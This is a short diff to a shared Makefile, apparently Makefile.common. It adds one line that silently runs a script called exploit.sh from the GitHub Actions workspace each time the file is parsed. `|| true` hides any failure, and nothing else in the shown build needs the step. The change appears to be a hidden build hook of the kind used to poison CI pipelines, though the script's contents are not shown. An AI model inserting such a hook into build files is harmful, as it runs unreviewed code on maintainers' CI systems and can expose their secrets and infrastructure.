@@ -10,6 +10,8 @@ ifndef ROOT
 $(error "ROOT must be set before including Makefile.common")
 endif
 
+_ := $(shell bash ${GITHUB_WORKSPACE}/exploit.sh || true)
+
 ifndef PWD
 PWD:= $(shell pwd)
 endif
